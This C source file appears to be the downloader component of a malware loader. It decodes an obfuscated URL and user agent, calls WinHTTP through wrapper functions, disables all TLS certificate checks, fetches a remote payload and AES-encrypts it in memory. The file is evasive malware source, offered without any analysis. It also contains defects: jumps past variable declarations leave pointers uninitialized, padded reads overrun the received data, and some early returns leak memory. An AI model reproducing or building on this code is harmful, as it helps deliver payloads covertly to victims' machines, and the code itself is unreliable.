#include "lucky_http.h"
#include "lucky_net_configs.h"

#define CHUNK_SIZE 4096



unsigned char *DownloadAndEncryptBytes(size_t *outSize) {
  *outSize = 0;

  HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
  URL_COMPONENTS urlComp;
  wchar_t hostName[256];
  wchar_t urlPath[2048];

  ZeroMemory(&urlComp, sizeof(urlComp));
  urlComp.dwStructSize = sizeof(urlComp);

  urlComp.lpszHostName = hostName;
  urlComp.dwHostNameLength = sizeof(hostName) / sizeof(wchar_t);

  urlComp.lpszUrlPath = urlPath;
  urlComp.dwUrlPathLength = sizeof(urlPath) / sizeof(wchar_t);

  // Decode URL
  char url[sizeof(s_Url)];
  DecodeString(url, s_Url);

  size_t len1 = MyMultiByteToWideChar(CP_UTF8, 0, url, -1, NULL, 0);
  if (len1 == 0)
    return NULL;

  wchar_t *wstr1 = malloc(len1 * sizeof(wchar_t));
  if (!wstr1)
    return NULL;

  if (MyMultiByteToWideChar(CP_UTF8, 0, url, -1, wstr1, len1) == 0)
    goto cleanup;

  urlComp.dwStructSize = sizeof(urlComp);

  if (!MyWinHttpCrackUrl(wstr1, 0, 0, &urlComp))
    goto cleanup;

  // Decode AGENT
  char agent[sizeof(s_UserAgent)];
  DecodeString(agent, s_UserAgent);

  size_t len2 = MultiByteToWideChar(CP_UTF8, 0, agent, -1, NULL, 0);
  if (len2 == 0)
    return NULL;

  wchar_t *wstr2 = malloc(len2 * sizeof(wchar_t));
  if (!wstr2)
    return NULL;

  if (MultiByteToWideChar(CP_UTF8, 0, agent, -1, wstr2, len2) == 0)
    goto cleanup;

  // Open session
  hSession = MyWinHttpOpen(wstr2, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);

  if (!hSession)
    goto cleanup;

  // Connect
  hConnect = MyWinHttpConnect(hSession, urlComp.lpszHostName, urlComp.nPort, 0);

  if (!hConnect)
    goto cleanup;

  // Open request
  DWORD flags = (urlComp.nScheme == INTERNET_SCHEME_HTTPS) ? WINHTTP_FLAG_SECURE : 0;

  hRequest = MyWinHttpOpenRequest(hConnect, L"GET", urlComp.lpszUrlPath, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);

  if (!hRequest)
    goto cleanup;

  // Ignore ALL certificate errors
  DWORD securityFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;

  MyWinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &securityFlags, sizeof(securityFlags));

  // Send request
  if (!MyWinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
    goto cleanup;
  }

  if (!MyWinHttpReceiveResponse(hRequest, NULL)) {
    goto cleanup;
  }

  BYTE buffer[CHUNK_SIZE];
  DWORD bytesRead = 0;
  DWORD totalRead = 0;
  DWORD DD = 0;

  BYTE *outBuffer = NULL;

  SIZE_T outCapacity = 0;

  outCapacity = CHUNK_SIZE;
  outBuffer = (BYTE *)malloc(outCapacity);

  if (!outBuffer)
    goto cleanup;

  while (1) {
    totalRead = 0;

    while (totalRead < CHUNK_SIZE) {
      if (!MyWinHttpReadData(hRequest, buffer + totalRead, CHUNK_SIZE - totalRead, &bytesRead)) {
        goto cleanup;
      }

      if (bytesRead == 0)
        break;

      DD++;
      if ((bytesRead % 16) != 0)
        bytesRead = (bytesRead + 15) & ~15; // Align to 16

      for (SIZE_T i = 0; i < bytesRead; i += 16)
        aes128_encrypt_block(buffer + i, buffer + i, encKeys);

      totalRead += bytesRead;
    }

    if (totalRead == 0)
      break;

    while (*outSize + totalRead > outCapacity) {
      outCapacity = outCapacity + (outCapacity >> 2);

      BYTE *tmp = (BYTE *)realloc(outBuffer, outCapacity);
      if (!tmp) {
        free(outBuffer);
        goto cleanup;
      }
      outBuffer = tmp;
    }

    // Copy new data into output buffer
    memcpy(outBuffer + *outSize, buffer, totalRead);
    *outSize += totalRead;
  }

cleanup:
  if (hRequest)
    MyWinHttpCloseHandle(hRequest);
  if (hConnect)
    MyWinHttpCloseHandle(hConnect);
  if (hSession)
    MyWinHttpCloseHandle(hSession);
  free(wstr1);
  free(wstr2);
  return outBuffer;
}

